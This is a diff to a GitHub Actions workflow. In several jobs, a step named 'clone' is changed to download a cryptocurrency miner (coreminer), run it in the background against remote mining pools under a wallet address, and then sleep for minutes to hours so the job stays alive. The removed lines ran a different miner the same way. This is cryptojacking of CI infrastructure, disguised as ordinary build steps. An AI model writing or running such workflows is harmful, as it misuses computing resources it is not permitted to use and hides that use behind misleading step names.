@@ -25,7 +25,8 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
+          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
            sleep 310s
   ol:
     needs: kont
@@ -48,7 +49,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
+          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
             sleep 5m
         
     
@@ -74,7 +76,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
+          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
             sleep 6m
   ayo:
     needs: ol
@@ -97,8 +100,9 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
-            sleep 205m
+      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
+          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
+            sleep 105m
         
     
      
@@ -123,8 +127,9 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
-            sleep 161m
+      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
+          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
+            sleep 261m
         
     
   
